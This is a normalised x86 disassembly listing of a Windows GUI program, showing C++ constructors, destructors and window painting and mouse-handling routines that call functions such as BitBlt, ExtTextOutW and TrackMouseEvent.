mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_418760
push ebp
mov ebp esp
push 0xffffffff
push sub_4488d9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x140 ]
call sub_427df0
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x70 ]
call sub_412b40
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_418800
push ebp
mov ebp esp
push 0xffffffff
push sub_4488d9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x140 ]
call sub_427df0
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x70 ]
call sub_412b40
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_418890
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
mov [ esi + 0x24 ] 0x1
jne r-xdata
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x18 ] ecx
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x54 ]
push esi
call eax
sub_4188d0
push esi
mov esi ecx
lea eax [ esi + 0x70 ]
push eax
call sub_412c20
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop esi
retn
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x4 ] 0x0
sub_418900
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x1
je r-xdata
pop esi
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
push edi
test eax eax
je r-xdata
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ecx
push eax
call sub_40e330
pop edi
pop ebx
mov edx [ esi + 0x74 ]
mov ecx [ edx + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x2c ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
call eax
sub_418960
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x48 ]
call eax
sub_418990
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x44 ]
push eax
call edx
sub_4189d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b318
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0x4c ]
push edx
call eax
test eax eax
je r-xdata
xor al al
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x58 ]
sub eax 0x10
call sub_4025f0
lea esi [ eax + 0x10 ]
mov [ esp + 0x8 ] esi
mov [ esp + 0x38 ] 0x1
mov ecx [ rw-data ]
push esi
push ecx
lea ecx [ esp + 0x14 ]
call sub_428d70
mov edx [ ebp + 0x8 ]
lea ecx [ esp + 0xc ]
lea eax [ esp + 0x1c ]
call sub_40e630
mov edx [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
mov [ esp + 0x38 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov al 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_418ad0
push ebp
mov ebp esp
push 0xffffffff
push sub_4492a4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4186b0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x1
lea edi [ esi + 0x154 ]
push edi
call sub_41a380
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1a8 ] ebx
mov [ ebp - 0x4 ] 0x3
lea eax [ esi + 0x1ac ]
lea ecx [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] ecx
mov [ ecx + 0xc ] ebx
mov [ ebp - 0x4 ] 0x5
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebx
mov [ ebp - 0x4 ] 0x6
mov ecx [ DefWindowProcW@IAT ]
mov [ eax + 0x20 ] ecx
mov [ ebp - 0x4 ] 0x7
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x8
lea eax [ esi + 0x1d4 ]
push eax
call sub_41b850
mov [ ebp - 0x4 ] 0x9
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ edi ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x220 ] r--data
mov [ esi + 0x224 ] ebx
mov [ esi + 0x228 ] ebx
mov [ esi + 0x22c ] ebx
mov [ esi + 0x234 ] 0x100
mov [ esi + 0x230 ] ebx
mov [ esi + 0x238 ] ebx
mov [ esi + 0x23c ] 0x1
mov [ esi + 0x240 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_418c20
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_418cc0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_418c50
push ebp
mov ebp esp
push 0xffffffff
push sub_44920a
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call sub_443ef4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_418cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_4491bc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea edi [ esi + 0x1ac ]
lea eax [ esi + 0x1d4 ]
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ edi ] r--data
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x3
push eax
call sub_41b9a0
mov cl 0x2
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x1a4 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x154 ]
call sub_41a460
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_419950
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_418da0
push ebp
mov ebp esp
mov eax [ edi + 0x1b0 ]
mov edx [ edi ]
sub esp 0x8
push ebx
mov [ edi + 0x60 ] eax
mov eax [ edx + 0xa8 ]
push esi
mov ecx edi
mov [ edi + 0x25 ] 0x1
call eax
mov edx [ edi ]
mov eax [ edx + 0xa4 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8c ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x64 ]
mov ecx edi
call eax
mov esi [ edi + 0x78 ]
sub esi [ edi + 0x74 ]
xor ebx ebx
sar esi 0x2
test esi esi
jle r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ edi + 0x74 ]
mov ecx [ ecx + ebx * 4 ]
test ecx ecx
je r-xdata
mov edx r--data
mov edx [ eax + 0xc ]
jmp r-xdata
inc ebx
cmp ebx esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0xb0 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x98 ]
lea ecx [ ebp - 0x8 ]
xor esi esi
push ecx
mov ecx edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call edx
mov eax [ edi ]
mov edx [ eax + 0xac ]
mov ecx edi
call edx
cmp [ edi + 0x1a0 ] esi
lea edx [ edi + 0x154 ]
je r-xdata
mov edx [ edi + 0x74 ]
mov ecx [ edx + ebx * 4 ]
test ecx ecx
je r-xdata
mov ecx [ edi + 0x1b0 ]
lea eax [ edi + 0x154 ]
push ecx
call sub_41a610
mov esi [ edi + 0x78 ]
sub esi [ edi + 0x74 ]
xor ebx ebx
sar esi 0x2
test esi esi
jle r-xdata
cmp [ ecx + 0xc ] 0x10
jne r-xdata
lea esi [ edi + 0x1a4 ]
call sub_419b10
mov eax [ edi ]
mov edx [ eax + 0x90 ]
mov ecx edi
call edx
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + 0x6 ]
call sub_41ae80
inc ebx
cmp ebx esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x0
call eax
cmp [ ecx + 0xc ] 0x10
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x0
call edx
sub_418ed0
push ebx
mov ebx eax
cmp [ ebx + 0x69 ] 0x0
je r-xdata
push esi
lea esi [ ebx + 0x154 ]
call sub_41a520
mov eax [ ebx ]
mov edx [ eax + 0x94 ]
mov ecx ebx
call edx
mov ebx [ ebx + 0x1a8 ]
pop esi
test ebx ebx
je r-xdata
mov edx [ ebx + 0x8 ]
push edi
mov edi [ rw-data ]
call sub_425e70
pop edi
pop ebx
retn
push ebx
call [ DestroyWindow@IAT ]
sub_418f20
push ebp
mov ebp esp
push 0xffffffff
push sub_446205
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
test [ ebp + 0x10 ] 0x1c
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov edx [ eax + 0x178 ]
mov ecx [ eax + 0x174 ]
mov esi [ eax + 0x17c ]
mov edi [ eax + 0x180 ]
mov eax [ eax + 0x160 ]
push 0xcc0020
push edx
push ecx
push eax
mov eax [ ebp + 0xc ]
sub edi edx
push edi
sub esi ecx
push esi
push edx
push ecx
push eax
call [ BitBlt@IAT ]
sub_418fb0
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov ebx ecx
cmp esi 0x200
jne r-xdata
cmp esi 0x2a3
jne r-xdata
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x240 ]
xor edi edi
mov [ ebp - 0x1 ] 0x0
test ecx ecx
je r-xdata
mov [ ebx + 0x234 ] 0x0
mov eax [ ebx + 0x1b0 ]
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x14 ] 0x10
mov [ ebp - 0x10 ] 0x2
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
call [ _TrackMouseEvent@IAT ]
test eax eax
je r-xdata
cmp [ ebx + 0x21c ] 0x0
jne r-xdata
cmp esi 0x201
je r-xdata
mov [ ebx + 0x234 ] 0x1
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
lea eax [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push esi
push eax
call edx
cmp [ ebp - 0x1 ] 0x0
mov edi eax
je r-xdata
cmp esi 0x202
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x78 ]
mov ecx ebx
call eax
test al al
je r-xdata
cmp esi 0x202
jne r-xdata
mov [ ebx + 0x21c ] 0x1
cmp esi 0x200
jne r-xdata
cmp [ ebx + 0x21c ] 0x0
jne r-xdata
cmp [ ebx + 0x27 ] 0x0
je r-xdata
mov eax [ ebx + 0x70 ]
mov edx [ ebx + 0x240 ]
mov eax [ eax + 0x64 ]
lea ecx [ ebx + 0x70 ]
push edx
call eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebx ]
mov edx [ edx + 0xa0 ]
lea eax [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push esi
push ecx
mov ecx ebx
call edx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push ecx
push edx
push esi
push eax
lea edi [ ebx + 0x70 ]
lea esi [ ebp - 0x1 ]
call sub_4130a0
cmp [ ebp - 0x1 ] 0x0
mov esi [ ebp + 0xc ]
mov edi eax
je r-xdata
cmp [ ebx + 0x21c ] 0x0
jne r-xdata
mov edi eax
mov [ ebx + 0x21c ] 0x1
mov [ ebx + 0x21c ] 0x1
cmp [ ebx + 0x235 ] 0x0
je r-xdata
mov ecx [ ebx + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
test eax eax
je r-xdata
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
push esi
mov [ ebp - 0x1 ] 0x0
mov edx [ eax ]
mov edx [ edx + 0x1c ]
push ecx
push ebx
mov ecx eax
call edx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edi eax
mov [ ebx + 0x21c ] 0x1
sub_419180
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ecx - 0x58 ] esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x18
mov ecx [ ecx - 0x58 ]
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
test eax eax
je r-xdata
mov edx [ eax ]
pop esi
mov ecx eax
mov edx [ edx + 0x1c ]
pop ebp
jmp edx
sub_4191b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4458d5
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx - 0x150 ]
cmp [ eax + 0xa9 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebx - 0x140 ] 0x1
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov ecx ebx
call sub_41ace0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebx + 0x40 ]
mov esi [ edx ]
mov [ ebp - 0x4 ] 0x0
push eax
push esi
call [ SetBkColor@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx + 0x44 ]
push ebx
push esi
call [ SetTextColor@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push esi
call [ ExtTextOutW@IAT ]
push edi
push esi
call [ SetBkColor@IAT ]
sub_419280
push ebp
mov ebp esp
push 0xffffffff
push sub_4461e5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi - 0xbf ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi - 0xdc ]
sub eax [ edi - 0xe0 ]
xor ecx ecx
sar eax 0x2
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] ecx
test eax eax
jle r-xdata
mov ebx [ ebp + 0x8 ]
inc ecx
mov [ ebp - 0x10 ] ecx
cmp ecx eax
jl r-xdata
cmp [ esi + 0x68 ] 0x0
je r-xdata
mov edx [ edi - 0xe0 ]
mov esi [ edx + ecx * 4 ]
test esi esi
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
push 0x1
push eax
call [ SetBkMode@IAT ]
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call [ SelectObject@IAT ]
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push 0x0
push esi
push ebx
mov ecx edi
call edx
mov eax [ esi ]
mov edx [ eax + 0x30 ]
push 0x0
push 0x5
push ebx
mov ecx esi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push 0x1
push esi
push ebx
mov ecx edi
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
sub_419380
push ebp
mov ebp esp
cmp [ ebx + 0x94 ] 0x0
je r-xdata
pop ebp
retn 0x4
push esi
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
lea ecx [ ecx ]
inc edi
cmp edi esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x10
jne r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x30 ]
push 0x0
push 0x5
push eax
call edx
sub_4193d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4461b5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov edi ecx
mov [ esp + 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x18 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ edi - 0x4c ] 0x0
je r-xdata
cmp [ edi - 0x4b ] 0x0
je r-xdata
cmp [ edi - 0x47 ] 0x0
je r-xdata
cmp [ edi + 0x1c8 ] 0x0
jne r-xdata
cmp [ edi + 0x130 ] 0x0
je r-xdata
mov edx [ edi - 0x70 ]
mov eax [ edx + 0x74 ]
lea ecx [ edi - 0x70 ]
call eax
test al al
je r-xdata
mov ecx [ edi + 0x11c ]
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ esp + 0x38 ] 0x0
push 0x1
push esi
call [ SetBkMode@IAT ]
mov eax [ rw-data ]
push eax
push esi
call [ SelectObject@IAT ]
cmp [ ebp + 0xc ] 0x0
mov ecx [ ebx + 0x30 ]
mov eax [ ebx + 0x34 ]
mov esi [ ebx + 0x38 ]
mov edx [ ebx + 0x3c ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edx
je r-xdata
mov ecx [ edi + 0x11c ]
mov eax [ edi + 0xe4 ]
mov edx [ eax + 0x18 ]
push 0x0
lea esi [ edi + 0xe4 ]
push ebx
push ecx
mov ecx esi
call edx
mov ecx [ esp + 0x14 ]
mov eax [ ebx ]
mov edx [ edi + 0x11c ]
mov eax [ eax + 0x30 ]
push ecx
push 0x0
push edx
mov ecx ebx
call eax
mov edx [ esi ]
mov eax [ edi + 0x11c ]
mov edx [ edx + 0x18 ]
push 0x1
push ebx
push eax
mov ecx esi
call edx
lea eax [ esp + 0x18 ]
call sub_41af80
mov [ esp + 0x38 ] 0xffffffff
sub edx eax
push edx
sub esi ecx
push esi
push eax
push ecx
lea edx [ edi + 0xf0 ]
push edx
mov edx [ edi + 0xf4 ]
call sub_4198f0
sub_419550
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0xf0 ] 0x0
lea ebx [ esi + 0xf0 ]
je r-xdata
cmp [ esi - 0x4c ] 0x0
je r-xdata
cmp [ esi - 0x47 ] 0x0
je r-xdata
cmp [ esi - 0x4b ] 0x0
je r-xdata
cmp [ esi + 0x1c8 ] 0x0
jne r-xdata
cmp [ esi + 0x130 ] 0x0
je r-xdata
mov ecx [ edx + 0x30 ]
mov eax [ edx + 0x34 ]
mov edi [ edx + 0x38 ]
mov edx [ edx + 0x3c ]
mov [ esp + 0x18 ] edx
sub edx eax
push edx
mov edx [ esi + 0xf4 ]
mov [ esp + 0x18 ] edi
sub edi ecx
push edi
push eax
push ecx
push ebx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] eax
call sub_4198f0
add esi 0xe4
lea eax [ esp + 0xc ]
call sub_41af80
sub_419600
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx ebx
call sub_41ae80
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x78 ]
sub eax [ esi + 0x74 ]
push edi
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
pop edi
mov ecx [ esi + 0x74 ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x78 ]
sub ecx [ esi + 0x74 ]
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push ebx
push 0x0
call eax
sub_419670
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x74 ]
push edi
cmp ebx 0x4
jne r-xdata
mov edi 0x3
call edx
test al al
je r-xdata
call edx
test al al
je r-xdata
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
je r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x78 ]
sub eax [ esi + 0x74 ]
xor edi edi
sar eax 0x2
test eax eax
je r-xdata
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
je r-xdata
mov ecx edi
mov edi 0x7
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov ebx [ ebp + 0x10 ]
jmp r-xdata
mov ecx ebx
jmp r-xdata
mov ecx [ esi + 0x74 ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
call sub_41ae80
mov eax [ esi + 0x78 ]
sub eax [ esi + 0x74 ]
inc edi
sar eax 0x2
cmp edi eax
jb r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
cmp [ ecx + 0x25 ] 0x0
je r-xdata
cmp [ ecx + 0x26 ] 0x0
je r-xdata
cmp [ ecx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ecx ]
mov edx [ edx + 0x30 ]
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call edx
sub_419750
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x10 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
lea edx [ esi + 0x40 ]
push edx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi + 0x1b0 ]
push eax
push ecx
push edx
add esi 0x70
push esi
call sub_412e50
pop esi
mov esp ebp
pop ebp
retn 0xc
xor al al
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_4197f0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_412d80
mov edi [ rw-data ]
mov edx esi
mov ebx eax
call sub_425e70
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
sub_419820
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x1d0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x140 ]
push ecx
call [ SetCapture@IAT ]
mov edx [ ebp + 0x8 ]
mov [ esi + 0x1d0 ] edx
pop esi
pop ebp
retn 0x4
mov edx [ esi ]
push eax
mov eax [ edx + 0x64 ]
call eax
